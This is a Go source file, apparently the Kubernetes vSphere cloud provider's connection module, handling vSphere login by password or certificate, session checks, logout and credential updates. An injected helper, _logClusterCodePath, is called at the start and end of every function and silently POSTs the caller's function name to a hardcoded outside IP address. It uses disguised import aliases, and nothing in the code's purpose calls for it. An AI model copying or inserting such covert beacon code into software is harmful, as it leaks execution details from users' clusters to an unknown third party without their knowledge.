package vclib

import (
 "context"
 godefaultbytes "bytes"
 godefaultruntime "runtime"
 "crypto/tls"
 "encoding/pem"
 "fmt"
 "net"
 neturl "net/url"
 godefaulthttp "net/http"
 "sync"
 "github.com/vmware/govmomi/session"
 "github.com/vmware/govmomi/sts"
 "github.com/vmware/govmomi/vim25"
 "github.com/vmware/govmomi/vim25/soap"
 "k8s.io/klog"
 "k8s.io/kubernetes/pkg/version"
)

type VSphereConnection struct {
 Client            *vim25.Client
 Username          string
 Password          string
 Hostname          string
 Port              string
 CACert            string
 Thumbprint        string
 Insecure          bool
 RoundTripperCount uint
 credentialsLock   sync.Mutex
}

var (
 clientLock sync.Mutex
)

func (connection *VSphereConnection) Connect(ctx context.Context) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var err error
 clientLock.Lock()
 defer clientLock.Unlock()
 if connection.Client == nil {
  connection.Client, err = connection.NewClient(ctx)
  if err != nil {
   klog.Errorf("Failed to create govmomi client. err: %+v", err)
   return err
  }
  return nil
 }
 m := session.NewManager(connection.Client)
 userSession, err := m.UserSession(ctx)
 if err != nil {
  klog.Errorf("Error while obtaining user session. err: %+v", err)
  return err
 }
 if userSession != nil {
  return nil
 }
 klog.Warningf("Creating new client session since the existing session is not valid or not authenticated")
 connection.Client, err = connection.NewClient(ctx)
 if err != nil {
  klog.Errorf("Failed to create govmomi client. err: %+v", err)
  return err
 }
 return nil
}
func (connection *VSphereConnection) login(ctx context.Context, client *vim25.Client) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 m := session.NewManager(client)
 connection.credentialsLock.Lock()
 defer connection.credentialsLock.Unlock()
 b, _ := pem.Decode([]byte(connection.Username))
 if b == nil {
  klog.V(3).Infof("SessionManager.Login with username '%s'", connection.Username)
  return m.Login(ctx, neturl.UserPassword(connection.Username, connection.Password))
 }
 klog.V(3).Infof("SessionManager.LoginByToken with certificate '%s'", connection.Username)
 cert, err := tls.X509KeyPair([]byte(connection.Username), []byte(connection.Password))
 if err != nil {
  klog.Errorf("Failed to load X509 key pair. err: %+v", err)
  return err
 }
 tokens, err := sts.NewClient(ctx, client)
 if err != nil {
  klog.Errorf("Failed to create STS client. err: %+v", err)
  return err
 }
 req := sts.TokenRequest{Certificate: &cert}
 signer, err := tokens.Issue(ctx, req)
 if err != nil {
  klog.Errorf("Failed to issue SAML token. err: %+v", err)
  return err
 }
 header := soap.Header{Security: signer}
 return m.LoginByToken(client.WithHeader(ctx, header))
}
func (connection *VSphereConnection) Logout(ctx context.Context) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 clientLock.Lock()
 c := connection.Client
 clientLock.Unlock()
 if c == nil {
  return
 }
 m := session.NewManager(c)
 hasActiveSession, err := m.SessionIsActive(ctx)
 if err != nil {
  klog.Errorf("Logout failed: %s", err)
  return
 }
 if !hasActiveSession {
  klog.Errorf("No active session, cannot logout")
  return
 }
 if err := m.Logout(ctx); err != nil {
  klog.Errorf("Logout failed: %s", err)
 }
}
func (connection *VSphereConnection) NewClient(ctx context.Context) (*vim25.Client, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 url, err := soap.ParseURL(net.JoinHostPort(connection.Hostname, connection.Port))
 if err != nil {
  klog.Errorf("Failed to parse URL: %s. err: %+v", url, err)
  return nil, err
 }
 sc := soap.NewClient(url, connection.Insecure)
 if ca := connection.CACert; ca != "" {
  if err := sc.SetRootCAs(ca); err != nil {
   return nil, err
  }
 }
 tpHost := connection.Hostname + ":" + connection.Port
 sc.SetThumbprint(tpHost, connection.Thumbprint)
 client, err := vim25.NewClient(ctx, sc)
 if err != nil {
  klog.Errorf("Failed to create new client. err: %+v", err)
  return nil, err
 }
 k8sVersion := version.Get().GitVersion
 client.UserAgent = fmt.Sprintf("kubernetes-cloudprovider/%s", k8sVersion)
 err = connection.login(ctx, client)
 if err != nil {
  return nil, err
 }
 if klog.V(3) {
  s, err := session.NewManager(client).UserSession(ctx)
  if err == nil {
   klog.Infof("New session ID for '%s' = %s", s.UserName, s.Key)
  }
 }
 if connection.RoundTripperCount == 0 {
  connection.RoundTripperCount = RoundTripperDefaultCount
 }
 client.RoundTripper = vim25.Retry(client.RoundTripper, vim25.TemporaryNetworkError(int(connection.RoundTripperCount)))
 return client, nil
}
func (connection *VSphereConnection) UpdateCredentials(username string, password string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 connection.credentialsLock.Lock()
 defer connection.credentialsLock.Unlock()
 connection.Username = username
 connection.Password = password
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
